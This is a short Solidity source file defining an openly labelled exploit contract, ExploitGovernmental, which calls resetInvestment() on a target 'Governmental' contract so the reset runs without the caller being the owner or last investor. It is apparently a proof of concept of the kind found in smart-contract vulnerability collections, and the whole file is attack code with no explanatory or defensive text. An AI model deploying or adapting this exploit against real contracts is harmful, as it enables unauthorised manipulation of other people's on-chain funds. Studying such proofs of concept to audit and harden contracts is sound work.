pragma solidity ^0.4.0;

contract ExploitGovernmental {
    Governmental public target;

    function ExploitGovernmental(address _target) public {
        target = Governmental(_target);
    }

    // Attack entry point
    function triggerExploit() public {
        // After ONE_MINUTE passed, exploit resetInvestment without being owner or lastInvestor
        target.resetInvestment();
    }

    // Fallback to prevent accidental ETH loss
    function () public payable {}
}

interface Governmental {
    function resetInvestment() external;
}

